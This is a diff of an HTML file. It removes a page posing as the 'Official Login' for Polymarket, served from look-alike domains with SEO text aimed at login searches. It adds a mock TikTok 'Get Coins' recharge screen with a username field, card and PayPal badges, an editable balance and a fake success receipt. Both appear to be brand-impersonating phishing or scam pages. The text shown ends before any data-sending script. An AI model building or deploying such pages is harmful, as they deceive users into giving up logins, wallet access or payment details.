@@ -1,472 +1,918 @@
 <!DOCTYPE html>
-<html lang="en" class="light">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <title>Polymarket | Official Login - World's Largest Prediction Market</title>
-    <meta name="description" content="Access your Polymarket account. The official Polymarket login for trading on world events, politics, and crypto. Join the world's largest decentralized prediction market.">
-    <meta name="keywords" content="polymarket, polymarket.com, polymarket login, polymarket official login, poly market, finance, trading, crypto prediction market">
-    <link rel="canonical" href="https://polymarket.netlify.app/">
-    <meta name="category" content="Finance, Prediction Markets, Cryptocurrency, Web3" />
-    <meta name="author" content="Polymarket Team" />
-<meta name="publisher" content="Polymarket.com" />
-    <meta name="robots" content="index, follow" />
-<meta name="geo.region" content="US, GB, CA, FR" />
-<meta name="geo.placename" content="Worldwide" />
-<meta name="language" content="en, fr, es" />
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<title>TikTok Coins</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=TikTok+Sans:wght@400;700&family=Poppins:wght@400;500;600;700;800&display=swap');
 
-<!-- Standard favicon for most browsers -->
-<link rel="icon" type="image/png" href="/favicon.png" sizes="32x32">
-
-<!-- Fallback for older browsers -->
-<link rel="shortcut icon" href="/favicon.png" type="image/png">
-
-<!-- Apple Touch Icon (iOS Safari, iPhone, iPad) -->
-<link rel="apple-touch-icon" href="/favicon.png" sizes="180x180">
-
-<!-- Android Chrome (optional, if you want home screen icon) -->
-<link rel="icon" type="image/png" sizes="192x192" href="/favicon.png">
-
-    
-    
-    <script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "WebSite",
-  "name": "Polymarket",
-  "url": "https://polymarkets.click/",
-  "potentialAction": {
-    "@type": "SearchAction",
-    "target": "https://polymarkets.click/search?q={search_term_string}",
-    "query-input": "required name=search_term_string"
+  :root {
+    --tiktok-red: #FE2C55;
+    --tiktok-black: #010101;
+    --tiktok-cyan: #25F4EE;
+    --coin-gold: #FFD700;
+    --coin-dark: #B8860B;
+    --bg: #F8F8F8;
+    --card: #FFFFFF;
+    --text: #161823;
+    --subtext: #8A8B91;
+    --border: #E8E8E8;
   }
-}
-</script>
 
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "Organization",
-  "name": "Polymarket",
-  "url": "https://polymarkets.click/",
-  "logo": "https://polymarkets.click/favicon.png",
-  "description": "Polymarkets is a platform focused on prediction markets, insights, and trending event forecasts.",
-  "foundingDate": "2026",
-  "sameAs": [
-    "https://twitter.com/polymarket",
-    "https://www.instagram.com/polymarket",
-    "https://www.linkedin.com/company/polymarket"
-  ]
-}
-</script>
+  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
 
-    <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "BreadcrumbList",
-      "itemListElement": [{
-        "@type": "ListItem",
-        "position": 1,
-        "name": "Home",
-        "item": "https://polymarkets.click"
-      },{
-        "@type": "ListItem",
-        "position": 2,
-        "name": "Login",
-        "item": "https://polymarkets.click"
-      }]
+  body {
+    background: #000;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    font-family: 'Poppins', sans-serif;
+    overflow: hidden;
+  }
+
+  /* Phone shell */
+  .phone {
+    width: 390px;
+    height: 844px;
+    background: var(--bg);
+    border-radius: 50px;
+    overflow: hidden;
+    position: relative;
+    box-shadow: 0 0 0 2px #222, 0 0 0 4px #111, 0 40px 80px rgba(0,0,0,0.8);
+  }
+
+  /* ======== PRELOADER ======== */
+  #preloader {
+    position:absolute; inset:0; z-index:999;
+    background:#010101;
+    display:flex; flex-direction:column;
+    align-items:center; justify-content:center;
+    gap:20px;
+  }
+  .tiktok-logo-wrap {
+    position:relative; width:90px; height:90px;
+    animation: logoScale 0.6s ease 0.5s both;
+  }
+  @keyframes logoScale {
+    from { transform: scale(0); opacity:0; }
+    to   { transform: scale(1); opacity:1; }
+  }
+  .tiktok-logo-wrap .layer {
+    position:absolute; inset:0;
+    display:flex; align-items:center; justify-content:center;
+  }
+  .tiktok-logo-wrap .layer.cyan  { transform: translate(-3px, 3px); }
+  .tiktok-logo-wrap .layer.red   { transform: translate(3px, -3px); }
+  .tiktok-logo-wrap .layer.white { }
+  .tiktok-d {
+    font-size:72px; font-weight:900; line-height:1;
+    font-family: 'Poppins', sans-serif;
+  }
+  .layer.cyan  .tiktok-d { color: var(--tiktok-cyan); }
+  .layer.red   .tiktok-d { color: var(--tiktok-red);  }
+  .layer.white .tiktok-d { color: #fff; }
+  .brand-name {
+    color:#fff; font-size:28px; font-weight:800; letter-spacing:1px;
+    animation: fadeUp 0.5s ease 0.9s both;
+  }
+  @keyframes fadeUp {
+    from { opacity:0; transform:translateY(10px); }
+    to   { opacity:1; transform:translateY(0); }
+  }
+  .loader-bar {
+    width:200px; height:3px; background:#222; border-radius:99px;
+    overflow:hidden;
+    animation: fadeUp 0.5s ease 1.1s both;
+  }
+  .loader-bar-fill {
+    height:100%; width:0%; background: linear-gradient(90deg, var(--tiktok-cyan), var(--tiktok-red));
+    border-radius:99px;
+    animation: loadFill 1.5s ease 1.2s both;
+  }
+  @keyframes loadFill {
+    from { width:0%; }
+    to   { width:100%; }
+  }
+
+  /* ======== SCREENS ======== */
+  .screen {
+    position:absolute; inset:0;
+    background: var(--bg);
+    display:none; flex-direction:column;
+    opacity:0; transform:translateX(30px);
+    transition: all 0.35s cubic-bezier(0.4,0,0.2,1);
+  }
+  .screen.active {
+    display:flex; opacity:1; transform:translateX(0);
+  }
+
+  /* Top nav */
+  .top-nav {
+    display:flex; align-items:center; justify-content:space-between;
+    padding: 52px 20px 12px;
+    background:#fff;
+  }
+  .nav-back {
+    width:36px; height:36px; display:flex; align-items:center; justify-content:center;
+    cursor:pointer; border-radius:50%;
+    transition: background 0.2s;
+  }
+  .nav-back:hover { background:#f0f0f0; }
+  .nav-title { font-size:18px; font-weight:700; color: var(--text); }
+  .nav-more {
+    width:36px; height:36px; display:flex; align-items:center; justify-content:center;
+    cursor:pointer; border-radius:50%;
+    transition: background 0.2s;
+  }
+  .nav-more:hover { background:#f0f0f0; }
+
+  /* Balance badge */
+  .balance-section {
+    background:#fff; padding:12px 20px 16px;
+    display:flex; align-items:center; gap:8px;
+  }
+  .balance-icon {
+    width:38px; height:38px; background:#010101; border-radius:8px;
+    display:flex; align-items:center; justify-content:center;
+    font-size:20px;
+  }
+  .balance-info { flex:1; }
+  .balance-label { font-size:11px; color:var(--subtext); font-weight:500; }
+  .balance-amount {
+    font-size:16px; font-weight:700; color:var(--text);
+    display:flex; align-items:center; gap:4px;
+  }
+  .coin-icon { font-size:14px; }
+  .balance-edit {
+    background: linear-gradient(135deg, var(--tiktok-red), #ff6b6b);
+    color:#fff; border:none; border-radius:8px; padding:6px 14px;
+    font-size:12px; font-weight:600; cursor:pointer;
+    transition: transform 0.15s, box-shadow 0.15s;
+  }
+  .balance-edit:hover { transform:scale(1.04); box-shadow:0 4px 12px rgba(254,44,85,0.35); }
+
+  /* ======== SCREEN 1: Get Coins ======== */
+  .recharge-section {
+    padding:16px 20px 8px;
+    background:#fff; margin-top:8px;
+  }
+  .recharge-label { font-size:12px; color:var(--subtext); margin-bottom:4px; }
+  .recharge-title { font-size:15px; font-weight:700; color:var(--text); margin-bottom:4px; }
+  .recharge-save {
+    font-size:11px; color:var(--subtext);
+    display:flex; align-items:center; gap:4px;
+  }
+  .recharge-save span { color:#2ba84a; font-weight:600; }
+
+  .username-input-wrap {
+    margin: 0 20px 0;
+    background:#fff; padding: 10px 16px;
+    border-radius:12px; border:2px solid var(--tiktok-red);
+    display:flex; align-items:center; gap:8px;
+  }
+  .username-input-wrap input {
+    flex:1; border:none; outline:none;
+    font-size:14px; color:var(--text); font-family:'Poppins',sans-serif;
+    background:transparent;
+  }
+  .username-input-wrap input::placeholder { color:#ccc; }
+  .at-sign { color:var(--subtext); font-size:16px; font-weight:600; }
+
+  .coins-grid {
+    display:grid; grid-template-columns:1fr 1fr 1fr;
+    gap:10px; padding:12px 20px;
+  }
+  .coin-option {
+    background:#fff; border:2px solid var(--border);
+    border-radius:14px; padding:12px 8px;
+    display:flex; flex-direction:column; align-items:center; gap:4px;
+    cursor:pointer; transition:all 0.2s;
+    position:relative; overflow:hidden;
+  }
+  .coin-option:hover, .coin-option.selected {
+    border-color: var(--tiktok-red);
+    background: #fff5f7;
+    transform: scale(1.03);
+    box-shadow: 0 4px 14px rgba(254,44,85,0.18);
+  }
+  .coin-option-icon { font-size:22px; }
+  .coin-option-amount { font-size:14px; font-weight:700; color:var(--text); }
+  .coin-option-price { font-size:10px; color:var(--subtext); font-weight:500; }
+  .coin-option.custom {
+    border-style:dashed; background:#fafafa;
+    justify-content:center;
+  }
+  .coin-option.custom span { font-size:13px; font-weight:600; color:var(--text); }
+
+  .recharge-btn {
+    margin:0 20px 16px; width:calc(100% - 40px);
+    background: linear-gradient(135deg, var(--tiktok-red) 0%, #ff0050 100%);
+    color:#fff; border:none; border-radius:14px;
+    padding:16px; font-size:16px; font-weight:700;
+    cursor:pointer; font-family:'Poppins',sans-serif;
+    display:flex; align-items:center; justify-content:center; gap:8px;
+    transition: all 0.2s;
+    box-shadow: 0 6px 20px rgba(254,44,85,0.35);
+  }
+  .recharge-btn:hover { transform:translateY(-2px); box-shadow:0 8px 24px rgba(254,44,85,0.45); }
+  .recharge-btn:disabled { background:#ccc; box-shadow:none; cursor:not-allowed; }
+
+  .invite-banner {
+    margin:0 20px 10px;
+    background: linear-gradient(135deg, #010101, #1a1a1a);
+    border-radius:14px; padding:12px 16px;
+    display:flex; align-items:center; justify-content:space-between;
+  }
+  .invite-text { color:#fff; font-size:12px; font-weight:600; }
+  .invite-sub  { color:#999; font-size:10px; }
+  .invite-btn  {
+    background: var(--tiktok-red); color:#fff;
+    border:none; border-radius:8px; padding:6px 12px;
+    font-size:11px; font-weight:700; cursor:pointer;
+  }
+
+  /* ======== SCREEN 2: Custom Coins ======== */
+  .custom-header {
+    background:#fff; padding:12px 20px;
+    display:flex; align-items:center; justify-content:space-between;
+  }
+  .custom-title { font-size:16px; font-weight:700; }
+  .help-btn {
+    width:28px; height:28px; border-radius:50%; border:2px solid var(--border);
+    display:flex; align-items:center; justify-content:center;
+    font-size:14px; color:var(--subtext); cursor:pointer;
+  }
+
+  .custom-label { padding:8px 20px; font-size:13px; color:var(--subtext); font-weight:500; background:#fff; }
+
+  .custom-display {
+    background:#fff; margin:0 20px;
+    border-radius:14px; border:2px solid var(--tiktok-red);
+    padding:16px 20px;
+    display:flex; align-items:center; justify-content:space-between;
+    min-height:56px;
+  }
+  .custom-display-val {
+    font-size:28px; font-weight:800; color:var(--text);
+    display:flex; align-items:center; gap:8px;
+  }
+  .custom-display-val .cursor {
+    display:inline-block; width:2px; height:30px;
+    background: var(--tiktok-red);
+    animation: blink 1s step-end infinite;
+  }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+
+  .custom-usd {
+    font-size:13px; color:var(--subtext); font-weight:600;
+    background:#f5f5f5; border-radius:8px; padding:4px 10px;
+  }
+
+  .keypad {
+    display:grid; grid-template-columns:1fr 1fr 1fr 1fr;
+    gap:1px; background:#e0e0e0;
+    margin-top:12px; flex:1;
+  }
+  .key {
+    background:#fff; display:flex; align-items:center; justify-content:center;
+    font-size:22px; font-weight:600; color:var(--text);
+    cursor:pointer; padding:18px 0; user-select:none;
+    transition: background 0.15s;
+  }
+  .key:active, .key:hover { background:#f0f0f0; }
+  .key.thousand { font-size:14px; font-weight:700; color:var(--tiktok-red); }
+  .key.backspace { font-size:18px; }
+  .key.wide { grid-column:span 2; }
+
+  .custom-total-bar {
+    background:#fff; padding:12px 20px;
+    display:flex; align-items:center; justify-content:space-between;
+    border-top:1px solid var(--border);
+  }
+  .total-label { font-size:12px; color:var(--subtext); }
+  .total-usd { font-size:18px; font-weight:800; color:var(--text); }
+
+  /* ======== SCREEN 3: Order Summary ======== */
+  .order-card {
+    margin:16px 20px 0; background:#fff;
+    border-radius:18px; padding:20px;
+    box-shadow:0 4px 20px rgba(0,0,0,0.06);
+  }
+  .order-card-title {
+    font-size:18px; font-weight:800; color:var(--text); margin-bottom:4px;
+  }
+  .order-secure {
+    display:flex; align-items:center; gap:4px;
+    font-size:11px; color:#2ba84a; margin-bottom:16px;
+  }
+  .order-row {
+    display:flex; align-items:center; justify-content:space-between;
+    padding:8px 0; border-bottom:1px solid #f5f5f5;
+  }
+  .order-row:last-child { border-bottom:none; }
+  .order-row-label { font-size:13px; color:var(--subtext); font-weight:500; }
+  .order-row-value { font-size:13px; font-weight:700; color:var(--text); }
+  .order-row-value.total { font-size:16px; color:var(--tiktok-red); }
+  .order-row-value.coins-sub { font-size:11px; color:var(--subtext); font-weight:400; display:block; text-align:right; }
+
+  .payment-section { margin:0 20px 0; }
+  .payment-title { font-size:13px; font-weight:700; color:var(--text); padding:12px 0 8px; }
+  .payment-methods {
+    background:#fff; border-radius:14px; padding:14px 16px;
+    display:flex; flex-direction:column; gap:10px;
+  }
+  .payment-row {
+    display:flex; align-items:center; justify-content:space-between;
+    cursor:pointer;
+  }
+  .payment-cards { display:flex; gap:6px; align-items:center; }
+  .card-badge {
+    height:24px; padding:0 8px; border-radius:4px;
+    display:flex; align-items:center; justify-content:center;
+    font-size:10px; font-weight:800; letter-spacing:0.5px;
+  }
+  .visa   { background:#1a1f71; color:#fff; }
+  .mc     { background:#eb001b; color:#fff; }
+  .amex   { background:#2e77bc; color:#fff; }
+  .jcb    { background:#003087; color:#fff; }
+  .paypal-logo {
+    background:#003087; color:#fff; border-radius:6px;
+    padding:4px 12px; font-size:12px; font-weight:800; letter-spacing:0.5px;
+    font-family:'Poppins',sans-serif;
+  }
+  .paypal-logo span { color:#009cde; }
+  .radio-circle {
+    width:18px; height:18px; border-radius:50%; border:2px solid var(--border);
+    display:flex; align-items:center; justify-content:center;
+    transition:all 0.2s;
+  }
+  .radio-circle.selected { border-color:var(--tiktok-red); }
+  .radio-circle.selected::after {
+    content:''; width:8px; height:8px; border-radius:50%;
+    background:var(--tiktok-red);
+  }
+  .divider { height:1px; background:var(--border); }
+
+  .terms-text {
+    margin:10px 20px 0; font-size:10px; color:var(--subtext); line-height:1.5;
+  }
+  .terms-text a { color:var(--tiktok-red); text-decoration:none; font-weight:600; }
+
+  /* ======== SCREEN 4: Processing ======== */
+  #screen-processing {
+    background:#fff;
+    align-items:center; justify-content:center;
+  }
+  .processing-wrap {
+    display:flex; flex-direction:column; align-items:center;
+    gap:20px; padding:40px 30px; text-align:center;
+  }
+  .processing-spinner {
+    width:80px; height:80px; border-radius:50%;
+    border:4px solid #f0f0f0;
+    border-top-color: var(--tiktok-red);
+    border-right-color: var(--tiktok-cyan);
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  .processing-title { font-size:20px; font-weight:800; color:var(--text); }
+  .processing-sub   { font-size:13px; color:var(--subtext); }
+  .processing-coins-anim {
+    display:flex; gap:12px; font-size:32px;
+    animation: bounce 0.6s ease infinite alternate;
+  }
+  @keyframes bounce { to { transform:translateY(-8px); } }
+
+  /* ======== SCREEN 5: Receipt ======== */
+  #screen-receipt {
+    background: linear-gradient(160deg, #010101 0%, #1a0008 100%);
+  }
+  .receipt-header {
+    padding:52px 20px 20px;
+    display:flex; flex-direction:column; align-items:center; gap:6px;
+  }
+  .receipt-check {
+    width:70px; height:70px; border-radius:50%;
+    background: linear-gradient(135deg, #2ba84a, #1d8038);
+    display:flex; align-items:center; justify-content:center;
+    font-size:32px;
+    box-shadow: 0 0 30px rgba(43,168,74,0.5);
+    animation: popIn 0.5s cubic-bezier(0.34,1.56,0.64,1);
+  }
+  @keyframes popIn {
+    from { transform:scale(0); opacity:0; }
+    to   { transform:scale(1); opacity:1; }
+  }
+  .receipt-success { font-size:20px; font-weight:800; color:#fff; }
+  .receipt-sub     { font-size:13px; color:#888; }
+
+  .receipt-card {
+    margin:0 20px; background:#1a1a1a;
+    border-radius:20px; padding:20px;
+    border:1px solid #2a2a2a;
+  }
+  .receipt-row {
+    display:flex; align-items:center; justify-content:space-between;
+    padding:10px 0; border-bottom:1px solid #2a2a2a;
+  }
+  .receipt-row:last-child { border-bottom:none; }
+  .receipt-label { font-size:13px; color:#888; font-weight:500; }
+  .receipt-value { font-size:13px; font-weight:700; color:#fff; }
+  .receipt-value.highlight { color:var(--coin-gold); font-size:16px; }
+  .receipt-value.red { color:var(--tiktok-red); }
+
+  .coins-explode {
+    text-align:center; padding:16px;
+    font-size:36px; letter-spacing:4px;
+    animation: fadeUp 0.5s ease 0.3s both;
+  }
+
+  .done-btn {
+    margin:12px 20px 0; width:calc(100% - 40px);
+    background: linear-gradient(135deg, var(--tiktok-red), #ff0050);
+    color:#fff; border:none; border-radius:14px;
+    padding:16px; font-size:16px; font-weight:700;
+    cursor:pointer; font-family:'Poppins',sans-serif;
+    transition:all 0.2s;
+    box-shadow:0 6px 20px rgba(254,44,85,0.4);
+  }
+  .done-btn:hover { transform:translateY(-2px); }
+
+  /* Balance edit modal */
+  .modal-overlay {
+    position:absolute; inset:0; background:rgba(0,0,0,0.5);
+    z-index:500; display:none; align-items:flex-end;
+    animation: fadeIn 0.2s ease;
+  }
+  .modal-overlay.open { display:flex; }
+  @keyframes fadeIn { from{opacity:0} to{opacity:1} }
+  .modal-sheet {
+    background:#fff; width:100%; border-radius:20px 20px 0 0;
+    padding:24px 20px 40px;
+    animation: slideUp 0.3s cubic-bezier(0.34,1.2,0.64,1);
+  }
+  @keyframes slideUp {
+    from{transform:translateY(100%)} to{transform:translateY(0)}
+  }
+  .modal-handle {
+    width:40px; height:4px; background:#e0e0e0;
+    border-radius:99px; margin:0 auto 20px;
+  }
+  .modal-title { font-size:16px; font-weight:800; color:var(--text); margin-bottom:16px; text-align:center; }
+  .modal-input {
+    width:100%; border:2px solid var(--border); border-radius:12px;
+    padding:14px 16px; font-size:18px; font-weight:700;
+    font-family:'Poppins',sans-serif; color:var(--text); outline:none;
+    text-align:center;
+    transition:border 0.2s;
+  }
+  .modal-input:focus { border-color:var(--tiktok-red); }
+  .modal-btn {
+    width:100%; margin-top:12px;
+    background:var(--tiktok-red); color:#fff;
+    border:none; border-radius:12px; padding:14px;
+    font-size:15px; font-weight:700; cursor:pointer;
+    font-family:'Poppins',sans-serif;
+    transition:all 0.2s;
+  }
+  .modal-btn:hover { background:#e0003e; }
+
+  /* Responsive for desktop view */
+  @media(max-width:430px){
+    .phone {
+      width:100vw; height:100vh;
+      border-radius:0; box-shadow:none;
     }
-    </script>
-    
-    <script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "FAQPage",
-  "mainEntity": [
-    {
-      "@type": "Question",
-      "name": "How do I log in to Polymarket?",
-      "acceptedAnswer": {
-        "@type": "Answer",
-        "text": "To log in to Polymarket, visit the official website and click the login button. You can sign in using your connected crypto wallet or supported authentication method."
-      }
-    },
-    {
-      "@type": "Question",
-      "name": "Do I need a crypto wallet to use Polymarket?",
-      "acceptedAnswer": {
-        "@type": "Answer",
-        "text": "Yes, Polymarket requires users to connect a supported cryptocurrency wallet in order to access markets and place trades."
-      }
-    },
-    {
-      "@type": "Question",
-      "name": "What should I do if I cannot log in?",
-      "acceptedAnswer": {
-        "@type": "Answer",
-        "text": "If you cannot log in, make sure your wallet is properly connected, clear your browser cache, and ensure you are using a supported browser. If the issue persists, contact official Polymarket support."
-      }
-    },
-    {
-      "@type": "Question",
-      "name": "Is Polymarket login available worldwide?",
-      "acceptedAnswer": {
-        "@type": "Answer",
-        "text": "Polymarket availability depends on local regulations. Some regions may have restrictions on access or trading features."
-      }
-    },
-    {
-      "@type": "Question",
-      "name": "Is it safe to log in to Polymarket?",
-      "acceptedAnswer": {
-        "@type": "Answer",
-        "text": "Polymarket uses secure authentication methods through crypto wallet connections. Always ensure you are on the official website before connecting your wallet."
-      }
-    }
-  ]
-}
-</script>
-
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/lucide@latest"></script>
-    <style>
-        .no-scrollbar::-webkit-scrollbar { display: none; }
-        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
-        .dark body { background:#111827; color:white; }
-        .google-btn { background-color: #0047FF; transition: background-color 0.2s; }
-        .google-btn:hover { background-color: #0036C1; }
-    </style>
+  }
+</style>
 </head>
+<body>
 
-<body class="bg-gray-50 dark:bg-gray-900 dark:text-white font-sans overflow-x-hidden">
+<div class="phone">
 
-<div class="max-w-md mx-auto bg-white dark:bg-gray-800 min-h-screen border-x relative flex flex-col">
+  <!-- ========== PRELOADER ========== -->
+  <div id="preloader">
+    <div class="tiktok-logo-wrap">
+      <div class="layer cyan"><span class="tiktok-d">♪</span></div>
+      <div class="layer red"> <span class="tiktok-d">♪</span></div>
+      <div class="layer white"><span class="tiktok-d">♪</span></div>
+    </div>
+    <div class="brand-name">TikTok</div>
+    <div class="loader-bar"><div class="loader-bar-fill"></div></div>
+  </div>
 
-    <header class="p-4 flex justify-between items-center border-b sticky top-0 bg-white dark:bg-gray-800 z-20">
-        <div class="flex items-center gap-2">
-            <div class="w-8 h-8 bg-black flex items-center justify-center rounded-sm">
-                <div class="w-5 h-5 border-2 border-white rotate-45"></div>
-            </div>
-            <h1 class="text-2xl font-bold tracking-tight">Polymarket</h1>
-        </div>
-        <div class="flex gap-3">
-            <button onclick="openLogin()" class="text-blue-600 font-bold px-2">Log In</button>
-            <button onclick="openLogin()" class="bg-blue-600 text-white px-5 py-2 rounded-lg font-bold">Sign Up</button>
-        </div>
-    </header>
-
-    <div class="flex px-4 py-3 gap-6 bg-white dark:bg-gray-800 overflow-x-auto no-scrollbar border-b text-sm font-semibold">
-        <div onclick="requireLogin()" class="cursor-pointer border-b-2 border-black pb-1">Trending</div>
-        <div onclick="requireLogin()" class="cursor-pointer text-gray-400">Breaking</div>
-        <div onclick="requireLogin()" class="cursor-pointer text-gray-400">New</div>
-        <div onclick="requireLogin()" class="cursor-pointer text-gray-400">Politics</div>
-        <div onclick="requireLogin()" class="cursor-pointer text-gray-400">Sports</div>
+  <!-- ========== SCREEN 1: GET COINS ========== -->
+  <div class="screen" id="screen-coins">
+    <div class="top-nav">
+      <div class="nav-back" onclick="goBack()">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#161823" stroke-width="2.5" stroke-linecap="round"><path d="M15 18l-6-6 6-6"/></svg>
+      </div>
+      <div class="nav-title">Get Coins</div>
+      <div class="nav-more">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="#161823"><circle cx="5" cy="12" r="2"/><circle cx="12" cy="12" r="2"/><circle cx="19" cy="12" r="2"/></svg>
+      </div>
     </div>
 
-    <div class="p-4 flex gap-2">
-        <div class="relative flex-grow">
-            <i data-lucide="search" class="absolute left-3 top-3 w-5 h-5 text-gray-400"></i>
-            <input onclick="requireLogin()" type="text" class="w-full bg-gray-100 dark:bg-gray-700 pl-10 pr-4 py-3 rounded-xl focus:outline-none" placeholder="Search">
-        </div>
-        <button onclick="requireLogin()" class="p-3 bg-gray-100 dark:bg-gray-700 rounded-xl"><i data-lucide="sliders-horizontal" class="w-5 h-5"></i></button>
-        <button onclick="requireLogin()" class="p-3 bg-gray-100 dark:bg-gray-700 rounded-xl"><i data-lucide="bookmark" class="w-5 h-5"></i></button>
+    <div class="balance-section">
+      <div class="balance-icon"><img src="https://www.tiktok.com/favicon.ico" style="width: 24px; height: 24px; border-radius: 4px;"></div>
+      <div class="balance-info">
+        <div class="balance-label">Recharge</div>
+        <div class="balance-amount"><span class="coin-icon">🪙</span><span id="balance-display">96,375,101</span></div>
+      </div>
+      <button class="balance-edit" onclick="openBalanceModal()">recharge</button>
     </div>
 
-    <div class="flex px-4 gap-2 overflow-x-auto no-scrollbar pb-2 text-sm">
-        <button class="bg-blue-100 text-blue-700 px-4 py-1.5 rounded-full font-bold">All</button>
-        <button class="bg-gray-100 dark:bg-gray-700 px-4 py-1.5 rounded-full font-semibold">Trump</button>
-        <button class="bg-gray-100 dark:bg-gray-700 px-4 py-1.5 rounded-full font-semibold">SOTU</button>
-        <button class="bg-gray-100 dark:bg-gray-700 px-4 py-1.5 rounded-full font-semibold">Iran</button>
-        <button class="bg-gray-100 dark:bg-gray-700 px-4 py-1.5 rounded-full font-semibold">Snow Storm</button>
+    <div style="overflow-y:auto;flex:1;padding-bottom:10px;">
+      <div style="margin:8px 20px 0; background:#fff; border-radius:14px; padding:12px 16px;">
+        <div style="font-size:11px;color:var(--subtext);margin-bottom:6px;">Recharge</div>
+        <div style="font-size:11px;color:var(--subtext);display:flex;align-items:center;gap:4px;">
+          <span style="color:#2ba84a;font-weight:700;">Save around 25%</span> with a lower third-party service fee ℹ️
+        </div>
+      </div>
+
+      <div style="margin:8px 20px 0;">
+        <div class="username-input-wrap">
+          <span class="at-sign">@</span>
+          <input id="username-input" type="text" placeholder="username" maxlength="30"/>
+        </div>
+      </div>
+
+      <div class="coins-grid">
+        <div class="coin-option" onclick="selectCoin(this,30,0.32)">
+          <div class="coin-option-icon">🪙</div>
+          <div class="coin-option-amount">30</div>
+          <div class="coin-option-price">US$0.32</div>
+        </div>
+        <div class="coin-option" onclick="selectCoin(this,350,3.70)">
+          <div class="coin-option-icon">🪙</div>
+          <div class="coin-option-amount">350</div>
+          <div class="coin-option-price">US$3.70</div>
+        </div>
+        <div class="coin-option" onclick="selectCoin(this,700,7.40)">
+          <div class="coin-option-icon">🪙</div>
+          <div class="coin-option-amount">700</div>
+          <div class="coin-option-price">US$7.40</div>
+        </div>
+        <div class="coin-option" onclick="selectCoin(this,1400,14.80)">
+          <div class="coin-option-icon">🪙</div>
+          <div class="coin-option-amount">1,400</div>
+          <div class="coin-option-price">US$14.80</div>
+        </div>
+        <div class="coin-option" onclick="selectCoin(this,3500,36.99)">
+          <div class="coin-option-icon">🪙</div>
+          <div class="coin-option-amount">3,500</div>
+          <div class="coin-option-price">US$36.99</div>
+        </div>
+        <div class="coin-option custom" onclick="goToCustom()">
+          <div class="coin-option-icon">✏️</div>
+          <span>Custom</span>
+        </div>
+      </div>
+
+      <div class="invite-banner">
+        <div>
+          <div class="invite-text">Invite & Get Rewards</div>
+          <div class="invite-sub">Try the new feature!</div>
+        </div>
+        <button class="invite-btn">Invite</button>
+      </div>
+
+      <button class="recharge-btn" id="recharge-btn" onclick="goToOrder()">
+        🪙 Recharge Coins
+      </button>
+    </div>
+  </div>
+
+  <!-- ========== SCREEN 2: CUSTOM ========== -->
+  <div class="screen" id="screen-custom">
+    <div class="top-nav">
+      <div class="nav-back" onclick="showScreen('screen-coins')">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#161823" stroke-width="2.5" stroke-linecap="round"><path d="M15 18l-6-6 6-6"/></svg>
+      </div>
+      <div class="nav-title">Custom</div>
+      <div class="help-btn">?</div>
     </div>
 
-    <div id="markets" class="px-4 space-y-4 pb-40 mt-4"></div>
+    <div style="background:#fff;padding:8px 20px;font-size:13px;color:var(--subtext);font-weight:500;border-bottom:1px solid var(--border);">Number of coins:</div>
 
-    <nav class="fixed bottom-0 w-full max-w-md bg-white dark:bg-gray-800 border-t flex justify-around py-3 text-gray-400 z-30">
-        <div onclick="requireLogin()" class="flex flex-col items-center cursor-pointer text-black dark:text-white">
-            <i data-lucide="home" class="w-6 h-6"></i><span class="text-[10px] font-bold">Home</span>
+    <div style="padding:12px 20px;background:#fff;">
+      <div class="custom-display">
+        <div class="custom-display-val">
+          <span>🪙</span>
+          <span id="custom-val">0</span>
+          <span class="cursor"></span>
         </div>
-        <div onclick="requireLogin()" class="flex flex-col items-center cursor-pointer">
-            <i data-lucide="search" class="w-6 h-6"></i><span class="text-[10px] font-bold">Search</span>
-        </div>
-        <div onclick="requireLogin()" class="flex flex-col items-center cursor-pointer">
-            <i data-lucide="zap" class="w-6 h-6"></i><span class="text-[10px] font-bold">Breaking</span>
-        </div>
-        <div onclick="toggleMenu()" class="flex flex-col items-center cursor-pointer">
-            <i data-lucide="menu" class="w-6 h-6"></i><span class="text-[10px] font-bold">More</span>
-        </div>
-    </nav>
-
-    <div id="menu-overlay" class="hidden fixed inset-0 bg-black/50 z-40 flex justify-end">
-        <div class="flex-grow" onclick="toggleMenu()"></div>
-        <div class="w-72 bg-white dark:bg-gray-800 h-full shadow-2xl p-6 flex flex-col">
-            <div class="space-y-6 pt-4 font-bold text-lg">
-                <div onclick="requireLogin()" class="flex items-center gap-3 cursor-pointer"><span class="text-xl">🏆</span> Leaderboard</div>
-                <div onclick="requireLogin()" class="flex items-center gap-3 cursor-pointer"><span class="text-xl">💰</span> Rewards</div>
-                <div onclick="requireLogin()" class="flex items-center gap-3 cursor-pointer"><span class="text-xl">🐙</span> APIs</div>
-            </div>
-
-            <hr class="my-6">
-
-            <div class="space-y-5 text-gray-500 font-semibold text-lg">
-                <div onclick="location.href='blog.html'" class="hover:text-black dark:hover:text-white cursor-pointer">📰 Blog</div>
-                <div onclick="location.href='support.html'" class="hover:text-black dark:hover:text-white cursor-pointer">Help Center</div>
-                <div onclick="location.href='terms.html'" class="hover:text-black dark:hover:text-white cursor-pointer">Terms of Service</div>
-                
-                <div class="flex items-center gap-4 py-4 border-t mt-4">
-                    <a href="https://x.com/Polymarket" target="_blank"><i data-lucide="twitter" class="w-5 h-5 cursor-pointer"></i></a>
-                    <a href="https://www.instagram.com/polymarket/" target="_blank"><i data-lucide="instagram" class="w-5 h-5 cursor-pointer"></i></a>
